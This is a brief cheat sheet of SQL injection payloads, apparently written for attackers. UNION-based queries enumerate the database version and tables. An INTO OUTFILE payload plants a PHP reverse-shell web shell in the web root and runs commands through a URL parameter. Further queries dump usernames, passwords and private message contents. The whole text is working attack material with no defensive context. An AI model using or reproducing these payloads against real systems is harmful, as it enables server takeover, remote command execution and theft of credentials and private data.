# uploading File with Mysql
1.
```<VALUE>' union select 1, @@version-- -```
2.
```<VALUE>' union select 1, table_name FROM information_schema.tables-- -```

> uploading:
```<VALUE>' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY <Sting to Text"php rev shell">#```

> then go to http://example.com/shell.php?cmd=`<exec>`

#List For Extract Data

1: 
```
12 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database()
```
2: 
```
12 union select 1,group_concat(username,password),3,4 from users   // select what u see in Data //
```
3: 
```
12 union select 1,group_concat(message_content),3,4 from messages    
```
